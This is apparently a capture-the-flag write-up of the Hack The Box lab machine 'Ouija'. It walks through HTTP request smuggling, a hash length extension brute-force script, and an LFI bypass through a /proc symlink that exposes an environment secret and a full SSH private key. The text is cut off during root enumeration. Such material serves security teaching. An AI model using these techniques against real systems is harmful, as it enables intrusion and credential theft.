---
layout: writeup
category: HTB
description: Ouija is a insane machine in which we have to complete the following steps. In first place, we have to fuzz the port 80 to see an index.php file that is not the default page of this web service and it redirects to ouija.htb. In second place, we have to fuzz subdomains of ouija.htb to discover that it has the dev.ouija.htb subdomain which retrieves a 403 Forbidden status code so it's not accessible. Then, we can see in the html source code of ouija.htb that it's calling a script file from gitea.ouija.htb where we can see a repository containing instructions on how to install this web page and we can see it's using haproxy 2.2.16 which is vulnerable to HTTP request smuggling ([CVE-2021-40346](https://www.cvedetails.com/cve/CVE-2021-40346/)). Next, we have to abuse this vulnerability to see the dev.ouija.htb subdomain where we can see the source code of the service running on port 3000 and where we will see how the auth works to make a hash extension attack to convert to admin. Then, we will abuse a LFI there to see the id_rsa of user leila abusing a /proc mount in current directory because the ../ and the files that starts with / are filtered and using /proc/self/root we are able to see it. Then, we will inspect a custom php plugin that is used for the post data username of a service running by root in port 9999 and we will be able to abuse it via a integer overflow and write a webshell in this working directory to gain access as root.
points: 50
solves: 821
tags: fuzzing html_inspection information_leakage haproxy http_request_smuggling CVE-2021-40346 source_code_inspection hash_extension_attack lfi proc_files php_plugin integer_overflow buffer_overflow webshell
date: 2024-05-18
title: HTB Ouija Writeup
comments: false
---

Ouija is a insane machine in which we have to complete the following steps. In first place, we have to fuzz the port 80 to see an index.php file that is not the default page of this web service and it redirects to ouija.htb. In second place, we have to fuzz subdomains of ouija.htb to discover that it has the dev.ouija.htb subdomain which retrieves a 403 Forbidden status code so it's not accessible. Then, we can see in the html source code of ouija.htb that it's calling a script file from gitea.ouija.htb where we can see a repository containing instructions on how to install this web page and we can see it's using haproxy 2.2.16 which is vulnerable to HTTP request smuggling ([CVE-2021-40346](https://www.cvedetails.com/cve/CVE-2021-40346/)). Next, we have to abuse this vulnerability to see the dev.ouija.htb subdomain where we can see the source code of the service running on port 3000 and where we will see how the auth works to make a hash extension attack to convert to admin. Then, we will abuse a LFI there to see the id_rsa of user leila abusing a /proc mount in current directory because the ../ and the files that starts with / are filtered and using /proc/self/root we are able to see it. Then, we will inspect a custom php plugin that is used for the post data username of a service running by root in port 9999 and we will be able to abuse it via a integer overflow and write a webshell in this working directory to gain access as root.


# Enumeration

## Port scanning

I will start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:

```bash
❯ sudo nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn 10.10.11.244
# Nmap 7.94SVN scan initiated Fri May 17 20:30:37 2024 as: nmap -sVC -p- --open --min-rate 5000 -v -n -Pn -sS -oN tcpTargeted 10.10.11.244
Nmap scan report for 10.10.11.244
Host is up (0.14s latency).
Not shown: 44823 closed tcp ports (reset), 20709 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 6f:f2:b4:ed:1a:91:8d:6e:c9:10:51:71:d5:7c:49:bb (ECDSA)
|_  256 df:dd:bc:dc:57:0d:98:af:0f:88:2f:73:33:48:62:e8 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  http    Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
|_http-favicon: Unknown favicon MD5: 03684398EBF8D6CD258D44962AE50D1D
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 17 20:31:30 2024 -- 1 IP address (1 host up) scanned in 53.47 seconds

```

> [My used arguments for nmap](http://gabrielgonzalez211.github.io/blog/nmap-arguments.html)

We have two interesting ports: port 80 (powered by Apache) and port 3000 (powered by Express).
## Web enumeration

### Port 3000

In port 3000, we have some things: we can see that is using Express, it retrieves a JSON string, and fuzzing retrieves some things:

```bash
❯ whatweb http://10.10.11.244:3000
http://10.10.11.244:3000 [200 OK] Country[RESERVED][ZZ], IP[10.10.11.244], X-Powered-By[Express]
```

![Port 3000 in browser](/assets/images/Ouija/port_3000.png)

```bash
❯ wfuzz -c --hc=404 -w /opt/SecLists/Discovery/Web-Content/common.txt -u http://10.10.11.244:3000/FUZZ -t 100 --hh=31
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.244:3000/FUZZ
Total requests: 4727

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000277:   200        0 L      5 W        42 Ch       "Login"                                                                                                                
000002521:   200        0 L      5 W        42 Ch       "login"                                                                                                                
000003486:   200        0 L      1 W        26 Ch       "register"                                                                                                             
000004353:   200        0 L      4 W        25 Ch       "users"                                                                                                                

Total time: 0
Processed Requests: 4727
Filtered Requests: 4723
Requests/sec.: 0
```

> Note: using directory-list-2.3-medium doesn't retrieve nothing more that with common.txt, that's why I always recommend testing with this dictionary before testing with other much bigger (common.txt -> 4726 lines and directory-list-2.3-medium.txt -> 220545)

Since we are dealing with json, I will use curl and jq to see beautifully what this endpoints do:

* /login: It requires uname and upass parameters but since we don't have any valid credentials, we can't use it:
    ```bash
    ❯ curl -s -X GET http://10.10.11.244:3000/login | jq
    {
      "message": "uname and upass are required"
    }
    ```

* /register: It seems to be disabled:
    ```bash
    ❯ curl -s -X GET http://10.10.11.244:3000/register | jq
    {
      "message": "__disabled__"
    }
    ```

* /users: It requires a ihash header and testing some random things in the parameters they request us, only gives us error messages. Also, testing the token, we can't know where it goes. So for now, we can't do nothing with this.
    ```bash
    ❯ curl -s -X GET http://10.10.11.244:3000/users | jq
    "ihash header is missing"
    ❯ curl -s -X GET http://10.10.11.244:3000/users -H "ihash: afedfeadadfa" | jq
    "identification header is missing"
    ❯ curl -s -X GET http://10.10.11.244:3000/users -H "ihash: afedfeadadfa" -H "identification: tatwatafaw" | jq
    "Invalid Token"
    ```

Since for now we don't have nothing useful that we can exploit, let's jump to port 80.

### Port 80

Here, we don't have nothing interesting in the main page, it's the default apache index.html. But fuzzing we can discover a index.php file that redirects us to ouija.htb

```bash
❯ whatweb http://10.10.11.244
http://10.10.11.244 [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.244], Title[Apache2 Ubuntu Default Page: It works]
```

![Default web page port 80 in browser](/assets/images/Ouija/port_80.png)

```bash
❯ wfuzz -c --hc=404 -w /opt/SecLists/Discovery/Web-Content/common.txt -u http://10.10.11.244/FUZZ -t 100
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.244/FUZZ
Total requests: 4727

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000024:   403        9 L      28 W       279 Ch      ".htaccess"                                                                                                            
000000023:   403        9 L      28 W       279 Ch      ".hta"                                                                                                                 
000000025:   403        9 L      28 W       279 Ch      ".htpasswd"                                                                                                            
000002202:   302        0 L      0 W        0 Ch        "index.php"                                                                                                            
000002201:   200        363 L    961 W      10671 Ch    "index.html"                                                                                                           
000003723:   200        530 L    1064 W     33996 Ch    "server-status"                                                                                                        

Total time: 11.91301
Processed Requests: 4727
Filtered Requests: 4721
Requests/sec.: 396.7928
```

```bash
❯ curl -s -X GET 'http://10.10.11.244/index.php' -v
*   Trying 10.10.11.244:80...
* Connected to 10.10.11.244 (10.10.11.244) port 80
> GET /index.php HTTP/1.1
> Host: 10.10.11.244
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/1.1 302 Found
< date: Sat, 18 May 2024 12:22:19 GMT
< server: Apache/2.4.52 (Ubuntu)
< location: http://ouija.htb/
< content-length: 0
< content-type: text/html; charset=UTF-8
< 
* Connection #0 to host 10.10.11.244 left intact
```

Now that we have this subdomain, let's add it to the /etc/hosts

```bash
❯ echo "10.10.11.244 ouija.htb" | sudo tee -a /etc/hosts
10.10.11.244 ouija.htb
```

And fuzz for possible subdomains:

```bash
❯ wfuzz -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.ouija.htb" -u http://ouija.htb --hh=10671
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://ouija.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000019:   403        3 L      8 W        93 Ch       "dev"                                                                                                                  
000000171:   403        3 L      8 W        93 Ch       "dev2"                                                                                                                 
000000302:   403        3 L      8 W        93 Ch       "devel"                                                                                                                
000000341:   403        3 L      8 W        93 Ch       "development"                                                                                                          
000000466:   403        3 L      8 W        93 Ch       "dev1"                                                                                                                 
000000612:   403        3 L      8 W        93 Ch       "develop"                                                                                                              
000000643:   403        3 L      8 W        93 Ch       "dev3"                                                                                                                 
000000804:   403        3 L      8 W        93 Ch       "developer"                                                                                                            
000001492:   403        3 L      8 W        93 Ch       "dev01"                                                                                                                
000001629:   403        3 L      8 W        93 Ch       "dev4"                                                                                                                 
000002341:   403        3 L      8 W        93 Ch       "developers"                                                                                                           
000002440:   403        3 L      8 W        93 Ch       "dev5"                                                                                                                 
000003044:   403        3 L      8 W        93 Ch       "devtest"                                                                                                              
000003662:   403        3 L      8 W        93 Ch       "dev-www"                                                                                                              
000003808:   403        3 L      8 W        93 Ch       "devil"                                                                                                                
000004275:   403        3 L      8 W        93 Ch       "dev.m"                                                                                                                

Total time: 0
Processed Requests: 4989
Filtered Requests: 4973
Requests/sec.: 0
```

We have a bunch of possible subdomains, all starts with dev so probably is bad configured and it requires only that starts with dev (`dev*`) so I will only add dev.ouija.htb to the /etc/hosts:

```bash
❯ echo '10.10.11.244 dev.ouija.htb' | sudo tee -a /etc/hosts
10.10.11.244 dev.ouija.htb
```

All the routes here retrieve a 403 forbidden status code so we can't use it for now (I'm filtering here all the requests that retrive a 403 status code and we don't have nothing):

```bash
❯ wfuzz -c -w /opt/SecLists/Discovery/Web-Content/common.txt -u http://dev.ouija.htb/FUZZ --hc=403 -t 100
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://dev.ouija.htb/FUZZ
Total requests: 4727

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================


Total time: 7.283406
Processed Requests: 4727
Filtered Requests: 4727
Requests/sec.: 649.0095
```

So the only remaining thing is ouija.htb, which seems a default page with no functionality:

```bash
❯ whatweb http://ouija.htb
http://ouija.htb [200 OK] Apache[2.4.52], Bootstrap, Country[RESERVED][ZZ], Email[info@ouija.htb], Frame, HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.244], JQuery, Script, Title[Ouija]
```

![ouija.htb in browser](/assets/images/Ouija/ouija.htb.png)

But looking at the source code, we can see that is calling a script from gitea.ouija.htb, a new subdomain:

![Discovering gitea.ouija.htb](/assets/images/Ouija/discovering_gitea_subdomain.png)

Let's add it to the /etc/hosts:

```bash
❯ echo '10.10.11.244 gitea.ouija.htb'
```

Inspecting that repository, we can see that it has instructions on how to install the web server. In those instructions, we can see that is using HA-proxy 2.2.16:

![Discovering HA-proxy 2.2.16](/assets/images/Ouija/discovering_use_of_haproxy.png)

Searching for vulnerabilities for this version, we found CVE-2021-40346, which is a vulnerability in HA-proxy 2.0 through 2.5 that consist in a HTTP request smuggling:

![Discovering CVE-2021-40346](/assets/images/Ouija/discovering_cve-2021-40346.png)

Also, if we search more, we can find [this article](https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/) that explains it very well and we can find a poc here:

![Request smuggling POC](/assets/images/Ouija/req_smuggling_poc.png)

Copy and paste it and adapt it to our needs but before click on settings of repeater, disable "Update Content-length" option and put the Content-Length needed (the number of characters that are here):

![Disabling Update Content-Length](/assets/images/Ouija/disabling_update_content-length.png)
![Exploiting HTTP request smuggling and seeing dev.ouija.htb](/assets/images/Ouija/exploiting_http_request_smuggling_dev_root.png)

If it doesn't work the first time, request multiple times because the machine works sometimes and another times not until you receive the response of above (dev.ouija.htb response):

Now we can see the source code of the api with the route that we are given in the `<a>` element:

![API code route leaked](/assets/images/Ouija/api_code_route_leaked.png)

![API code leaked](/assets/images/Ouija/api_code_leaked.png)

Copy the app.js code and save it into a file to inspect it better with vscode.

Also the init.sh is important, so do the same:

![init.sh code](/assets/images/Ouija/init.sh_code.png)

Another thing to take into account is that we have a LFI in the editor.php?file parameter:

![LFI in editor.php](/assets/images/Ouija/lfi_editor.php.png)

Now inspecting the app.js, we can see that the only working endpoint is /file/get because the rest returns messages saying that is disabled.
Also, we can see that in order to be able to use this functionality, the ensure_auth(q, r) function must return true:

```javascript
app.get("/file/get",(q,r,n) => {
    ensure_auth(q, r);
    if(!q.query.file){
        r.json({"message":"?file= i required"});
    }else{
        let file = q.query.file;
        if(file.startsWith("/") || file.includes('..') || file.includes("../")){
            r.json({"message":"Action not allowed"});
        }else{
            fs.readFile(file, 'utf8', (e,d)=>{
                if(e) {
                    r.json({"message":e});
                }else{
                    r.json({"message":d});
                }
            });
        }
    }
});
```

Then ensure_auth(q,n) function takes the two parameters and verify if the verify_cookies(identification_header, ihash_header) returns 0 and if not it says "Invalid token" (like we saw before). It also checks if the function d(identification_header) includes the string "::admin:True" and if not it says "Insufficient privileges":

```javascript
function ensure_auth(q, r) {
    if(!q.headers['ihash']) {
        r.json("ihash header is missing");
    }
    else if (!q.headers['identification']) {
        r.json("identification header is missing");
    }

    if(verify_cookies(q.headers['identification'], q.headers['ihash']) != 0) {
        r.json("Invalid Token");
    }
    else if (!(d(q.headers['identification']).includes("::admin:True"))) {
        r.json("Insufficient Privileges");
    }
}
```

Let's start with the verify_cookies function, which verifies if the generate_cookies(d(identification_header)) returns the hash that is passed of the ihash header:

```javascript
function verify_cookies(identification, rhash){
    if( ((generate_cookies(d(identification)))) === rhash){
        return 0;
    }else{return 1;}
}
```

Now the d function do some base64 decoding and returns the result:

```javascript
function d(b){
    s1=(Buffer.from(b, 'base64')).toString('utf-8');
    s2=(Buffer.from(s1.toLowerCase(), 'hex'));
    return s2;
}
```

The generate_cookies function do some sha256 hashing and retrieves the result:

```javascript
function generate_cookies(identification){
    var sha256=crt.createHash('sha256');
    wrap = sha256.update(key);
    wrap = sha256.update(identification);
    hash=sha256.digest('hex');
    return(hash);
}
```

In conclusion, the relevant simplified code taking into account that only the /file/get route works and removing most of the functions statements to make it more readable to understand it, is like this:

```javascript
const key = process.env.k;
function ensure_auth(q, r) {
    identification_header = q.headers['identification']
    ihash_header = q.headers['ihash']
    s1=(Buffer.from(identification_header, 'base64')).toString('utf-8');
    s2=(Buffer.from(s1.toLowerCase(), 'hex'));
    identification = s2;
    var sha256=crt.createHash('sha256');
    wrap = sha256.update(key);
    wrap = sha256.update(identification);
    hash=sha256.digest('hex');
    if( hash != ihash_header){
        r.json("Invalid Token");
    }

    if(!ihash_header) {
        r.json("ihash header is missing");
    }
    else if (!identification_header) {
        r.json("identification header is missing");
    }

    if( hash != ihash_header){
        r.json("Invalid Token");
    }

    else if (!(identification_header.includes("::admin:True"))) {
        r.json("Insufficient Privileges");
    }
}

app.get("/file/get",(q,r,n) => {
    ensure_auth(q, r);
    if(!q.query.file){
        r.json({"message":"?file= i required"});
    }else{
        let file = q.query.file;
        if(file.startsWith("/") || file.includes('..') || file.includes("../")){
            r.json({"message":"Action not allowed"});
        }else{
            fs.readFile(file, 'utf8', (e,d)=>{
                if(e) {
                    r.json({"message":e});
                }else{
                    r.json({"message":d});
                }
            });
        }
    }
});
```

It uses the "identification" header to decode it from base64 and then decode it from hex, the "ihash" header and a key that retrieves from environment which we don't need.

The init.sh file give us a clue on how identification should be:
```bash
❯ cat init.sh | grep botauth_id
export botauth_id="bot1:bot"
```
Also, we have the "ihash" that should be used:
```bash
❯ cat init.sh | grep hash
export hash="4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1"
```
According to the init.sh code, the "k" variable value it's the content of /opt/auth/api.key, which we can't access with the LFI:

![/opt/auth/api.key not accessible with LFI](/assets/images/Ouija/api.key_not_accessible.png)

However, we can access the api by encoding the botauth_id to hex and then to base64 and pass it to the "identification" header:

```bash
❯ echo -n "bot1:bot" | xxd -p |  base64 -w 0; echo
NjI2Zjc0MzEzYTYyNmY3NAo=
❯ curl -s -X GET -H "ihash: 4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1" -H "identification: NjI2Zjc0MzEzYTYyNmY3NAo=" 'http://10.10.11.244:3000/file/get?file=test' | jq
"Insufficient Privileges"
```

# Access as leila

Now the message is "Insufficient Privileges" that it's showed when it verifies that the decoded value of the "identification" header doesn't contain the string "::admin:True". For now, we can't achieve the access to this api due to the fact that we can't retrieve the hash for "bot1:bot::admin:True" because we don't have the key.

However, we can perform a hash extension attack to retrieve the token with [this tool](https://github.com/iagox86/hash_extender). This github explains so well why it works if you want to read it. But now I will jump directly to the vuln

```bash
❯ git clone https://github.com/iagox86/hash_extender
Cloning into 'hash_extender'...
remote: Enumerating objects: 644, done.
remote: Counting objects: 100% (20/20), done.
remote: Compressing objects: 100% (17/17), done.
remote: Total 644 (delta 5), reused 7 (delta 3), pack-reused 624
Receiving objects: 100% (644/644), 189.86 KiB | 765.00 KiB/s, done.
Resolving deltas: 100% (422/422), done.
❯ cd hash_extender
❯ make
[CC] hash_extender_engine.o
[... SNIP ...]
[LD] hash_extender
[LD] hash_extender_test
```

Before compiling it, remove the -Werror flag from the make file like it's said in [this issue](https://github.com/iagox86/hash_extender/issues/22).
Now we can use this tool for retrieving the token, but we don't now the length, so we can perform brute force on the webapp to see which one works, i have created and used this script:

```bash
#!/bin/bash

for i in $(seq 1 100);do
  ihash=$(./hash_extender --data='bot1:bot' --secret=$i --append='::admin:True' --signature=4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1 --format=sha256 | grep "New signature" | awk '{print $2}' FS=':' | tr -d ' ' | tr -d '\n')
  identification=$(./hash_extender --data='bot1:bot' --secret=$i --append='::admin:True' --signature=4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1 --format=sha256 | grep "New string" | awk '{print $2}' FS=':' | tr -d ' ' | tr -d '\n' | base64 -w 0)
  output=$(curl -s -X GET -H "ihash: $ihash" -H "identification: $identification" 'http://10.10.11.244:3000/file/get?file=test')
  sleep 1
  echo $output | grep -v "Invalid Token" && echo "[+] Valid length: $i, ihash: $ihash and identification: $identification" && break
done
```

Now we have the valid ihash and identification and we can confirm it by doing a curl command:

```
❯ curl -s -X GET -H "ihash: 14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b" -H "identification: NjI2Zjc0MzEzYTYyNmY3NDgwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDBmODNhM2E2MTY0NmQ2OTZlM2E1NDcyNzU2NQ==" 'http://10.10.11.244:3000/file/get?file=/etc/passwd'
{"message":"Action not allowed"}
```

The authentication works but I get "Action not allowed" because it has a sanitization for LFI:

```javascript
if(file.startsWith("/") || file.includes('..') || file.includes("../")){
    r.json({"message":"Action not allowed"});
}else{
    fs.readFile(file, 'utf8', (e,d)=>{
        if(e) {
            r.json({"message":e});
        }else{
            r.json({"message":d});
        }
    });
}
```

However in the init.sh we can see that is mounting `/proc` in `.config/bin/process_informations`:

```bash
❯ cat init.sh -p | grep proc
ln -s /proc .config/bin/process_informations
```

So we can try to see /proc/self/environ for example:

```bash
❯ curl http://ouija.htb:3000/file/get?file=.config/bin/process_informations/self/environ -H "identification: NjI2Zjc0MzEzYTYyNmY3NDgwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDBmODNhM2E2MTY0NmQ2OTZlM2E1NDcyNzU2NQ==" -H "ihash: 14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b" -s | jq -r '.message' | sed 's/\\000/\n/g'
LANG=en_US.UTF-8
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOME=/home/leila
LOGNAME=leila
USER=leila
SHELL=/bin/bash
INVOCATION_ID=fe2b8312bab3450fa67aa83479a149e8
JOURNAL_STREAM=8:22049
SYSTEMD_EXEC_PID=848
k=FKJS645GL41534DSKJ@@GBD
```

We can see the k key (which is not useful now) and that the user running this process is leila, let's see if we can see the id_rsa for this user via /proc/self/root which is a symbolic link to /:

```bash
❯ curl http://ouija.htb:3000/file/get?file=.config/bin/process_informations/self/root/home/leila/.ssh/id_rsa -H "identification: NjI2Zjc0MzEzYTYyNmY3NDgwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDBmODNhM2E2MTY0NmQ2OTZlM2E1NDcyNzU2NQ==" -H "ihash: 14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b" -s | jq -r '.message'
-----BEGIN OPENSSH PRIVATE KEY-----
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
DvfM2TbsfLo4kAAAALbGVpbGFAb3VpamE=
-----END OPENSSH PRIVATE KEY-----
```

Now we have access as leila via ssh:

```bash
❯ chmod 600 leila_id_rsa
❯ ssh -i leila_id_rsa leila@ouija.htb
The authenticity of host 'ouija.htb (10.10.11.244)' can't be established.
ED25519 key fingerprint is SHA256:r/qRxNW7X+LWMsUuQWHqvxNMWuh8S5GGfoK6w5j/4sc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'ouija.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun May 19 10:50:01 AM UTC 2024

  System load:                      0.01904296875
  Usage of /:                       92.0% of 5.07GB
  Memory usage:                     45%
  Swap usage:                       0%
  Processes:                        408
  Users logged in:                  0
  IPv4 address for br-38f37b371653: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.244
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:da7a

  => / is using 92.0% of 5.07GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun May 19 05:26:19 2024 from 10.10.14.11
leila@ouija:~$ export TERM=xterm
leila@ouija:~$ ls
user.txt
leila@ouija:~$ cat user.txt 
4b****************************6f
```

# Access as root

Looking at the running services, we can see a bunch of 600* ports, which are the same (they probably are a instance of the web for each user using the machine to load balance and for the users to not have problems):

```bash
leila@ouija:~$ netstat -ntlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6008         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6009         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6010         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6011         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6012         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6013         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6014         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6015         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6000         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6001         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6002         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6003         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6004         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6005         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6006         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6007         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:44493         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:3002         0.0.0.0:*               LISTEN      -                   
